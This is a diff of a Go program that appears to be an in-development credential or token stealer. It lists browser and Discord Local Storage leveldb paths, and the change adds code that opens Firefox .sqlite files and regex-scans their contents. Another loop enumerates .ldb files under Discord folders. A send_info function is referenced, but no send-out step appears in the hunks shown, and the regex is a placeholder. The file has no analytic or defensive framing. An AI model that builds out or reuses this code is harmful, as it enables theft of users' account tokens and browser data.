@@ -3,8 +3,10 @@ package main
 import (
 	"fmt"
 	"io/fs"
+	"io/ioutil"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strings"
 )
 
@@ -23,7 +25,7 @@ func send_info() {
 }
 
 func start() {
-	appdata, _ := os.UserHomeDir()
+	appdata, _ := os.UserConfigDir()
 	localappdata, _ := os.UserCacheDir()
 	locations := []string{}
 
@@ -45,18 +47,21 @@ func start() {
 	locations = append(locations, localappdata+"\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\")
 
 	for _, location := range locations {
-		fmt.Println(location)
-
 		if _, err := os.Stat(location); os.IsNotExist(err) {
 			continue
 		}
 		if strings.Contains(location, "Mozilla") {
-			for _, file := range get_files(location, ".sqlite") {
-				fmt.Println(file)
+			for _, filepath := range get_files(location, ".sqlite") {
+				r := regexp.MustCompile("image")
+				file, _ := os.Open(filepath)
+				data, _ := ioutil.ReadAll(file)
+				for _, match := range r.FindAllStringSubmatch(string(data), -1) {
+					fmt.Println(match)
+
+				}
 			}
 		}
 		if strings.Contains(location, "cord") {
-			fmt.Println("test")
 			for _, file := range get_files(location, ".ldb") {
 				fmt.Println(file)
 			}
